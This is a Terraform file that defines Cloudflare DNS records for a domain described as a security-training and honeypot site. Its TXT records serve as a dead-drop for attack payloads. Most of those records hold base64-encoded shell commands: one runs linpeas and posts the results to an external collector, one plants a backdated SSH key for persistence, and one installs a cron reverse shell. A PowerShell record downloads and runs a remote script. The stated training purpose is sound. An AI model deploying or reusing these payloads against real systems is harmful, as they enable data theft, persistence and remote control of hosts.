##############################################################################
# m41w423mu572un.xyz — security-training / honeypot domain.
#
# Ported record-for-record from the CURRENT
# home0ps/iac/dns_records_malwaremustrun.xyz.tf. All content values are
# copied byte-for-byte as opaque strings — this is deliberate detection-
# engineering training material (dead-drop-resolver style payloads), not
# something to "clean up" or reformat.
#
# Every record here is DNS-only (proxied not set — A records default to
# false): these point at specific external test IPs for the training
# exercises, and proxying them through Cloudflare's edge would rewrite the
# IP a client actually connects to.
#
# Hetzner's hcloud_zone_rrset groups multiple TXT values under one name —
# Cloudflare has no such grouping, so each value here is its own
# cloudflare_dns_record sharing the same name/type.
##############################################################################

#############################################
# A records
#############################################

resource "cloudflare_dns_record" "a_c2_malware_edr_tester" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "c2-malware-edr-tester"
  type    = "A"
  content = "35.228.196.57"
  ttl     = 60
  proxied = false
}

resource "cloudflare_dns_record" "a_phish_tester" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "phish-tester"
  type    = "A"
  content = "34.88.103.162"
  ttl     = 60
  proxied = false
}

#############################################
# TXT records
#############################################

resource "cloudflare_dns_record" "txt_absalomabsalomortherottersclub_1" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "absalomabsalomortherottersclub"
  type    = "TXT"
  ttl     = 60
  content = "Y3VybCAtTCBodHRwczovL2dpdGh1Yi5jb20vY2FybG9zcG9sb3AvUEVBU1MtbmcvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2xpbnBlYXMuc2ggfCBzaCA+IC9kZXYvc2htL28udHh0ICYmIGN1cmwgLVggUE9TVCAtSCAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiIC1kIEAvZGV2L3NobS9vLnR"
}

resource "cloudflare_dns_record" "txt_absalomabsalomortherottersclub_2" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "absalomabsalomortherottersclub"
  type    = "TXT"
  ttl     = 60
  content = "4dCBodHRwczovL2VvaW8yMGhnam5icHg4eS5tLnBpcGVkcmVhbS5uZXQvICYmIHJtIC9kZXYvc2htL28udHh0ICMgYmFzaCBjcmFkbGUgYnkgZGlsbGlnZW50X2IwMGt3MHJtCg=="
}

resource "cloudflare_dns_record" "txt_multipass" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "multipass"
  type    = "TXT"
  ttl     = 60
  content = "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUdBbkV3aWczTFBPMkdyUkgvQkZFWHhWK2EvN1pNYUxpdzhDQlphbFBPd3cK"
}

resource "cloudflare_dns_record" "txt_opentofu" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "opentofu"
  type    = "TXT"
  ttl     = 3600
  content = "sometext"
}

resource "cloudflare_dns_record" "txt_pneumono_1" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "pneumonoultramicroscopicsilicovolcanoconiosis"
  type    = "TXT"
  ttl     = 60
  content = "b2xkZXN0X3VzZXI9JChscyAtbHQgL2hvbWUgfCB0YWlsIC1uIDEgfCBhd2sgJ3twcmludCAkOX0nKSAmJiBrZXk9JChkaWcgK3Nob3J0IFRYVCBtdWx0aXBhc3MubTQxdzQyM211NTcydW4ueHl6IHwgdHIgLWQgJyInIHwgYmFzZTY0IC1kKSAmJiBlY2hvICIka2V5IiA+PiAvaG9tZS8kb2xkZXN0X3VzZXIvLnNzaC9hdXRob3JpemVkX2t"
}

resource "cloudflare_dns_record" "txt_pneumono_2" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "pneumonoultramicroscopicsilicovolcanoconiosis"
  type    = "TXT"
  ttl     = 60
  content = "leXMgJiYgdG91Y2ggLWQgIjIgbW9udGhzIGFnbyIgL2hvbWUvJG9sZGVzdF91c2VyLy5zc2gvYXV0aG9yaXplZF9rZXlzICYmIGVjaG8gInBlcnNpc3RlbmNlIGFkZGVkIGFuZCBhdXRob3JpemVkX2tleXMgYmFja2RhdGVkIGZvciB1c2VyOiAkb2xkZXN0X3VzZXIiICMgc3NoIHNoZW5hbmlnYW5zIGJ5IDBibm94aW91c18wd2wK"
}

resource "cloudflare_dns_record" "txt_ps" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "ps"
  type    = "TXT"
  ttl     = 60
  content = "powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kaywoz/bluestuff/main/powershell/Payload-nonsense.ps1')\""
}

resource "cloudflare_dns_record" "txt_second" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "second"
  type    = "TXT"
  ttl     = 60
  content = "placeholder bash"
}

resource "cloudflare_dns_record" "txt_test" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "test"
  type    = "TXT"
  ttl     = 60
  content = "aG9zdG5hbWU="
}

resource "cloudflare_dns_record" "txt_trainstation" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "trainstation"
  type    = "TXT"
  ttl     = 60
  content = "https://key.m41w423mu572un.xyz/trainticket.ps1"
}

resource "cloudflare_dns_record" "txt_wolfeschlegel_1" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "wolfeschlegelsteinhausenbergerdorff"
  type    = "TXT"
  ttl     = 60
  content = "KHN1YmRvbWFpbj0kKGRpZyArc2hvcnQgVFhUIGxsYW5mYWlycHdsbGd3eW5neWxsZ29nZXJ5Y2h3eXJuZHJvYnd5bGxsbGFudHlzaWxpb2dvZ29nb2NoLm9idmlvdXNwaGlzaC5jb20gfCB0ciAtZCAnIicgfCBiYXNlNjQgLWRpKTsgY3JvbnRhYiAtbCA+IC50YWI7IGVjaG8gIjIgKiAqICogKiAvYmluL2Jhc2ggLWwgPiAvZGV2L3RjcC8"
}

resource "cloudflare_dns_record" "txt_wolfeschlegel_2" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "wolfeschlegelsteinhausenbergerdorff"
  type    = "TXT"
  ttl     = 60
  content = "kc3ViZG9tYWluLm9idmlvdXNwaGlzaC5jb20vNDI0MiAwPCYxIDI+JjEiID4+IC50YWI7IGNyb250YWIgLnRhYjsgcm0gLnRhYikgPiAvZGV2L251bGwgMj4mMSAjIG1pc2NoaWVmIGFuZCBtaXNkaXJlY3Rpb24gYnkgbGlsTTBua3kK"
}

resource "cloudflare_dns_record" "txt_supersoaker" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "supersoaker5"
  type    = "TXT"
  ttl     = 60
  content = "the soakiest of soaks"
}

resource "cloudflare_dns_record" "txt_tester123dafinalone" {
  zone_id = cloudflare_zone.m41w423mu572un_xyz.id
  name    = "tester123dafinalone"
  type    = "TXT"
  ttl     = 60
  content = "can u read"
}
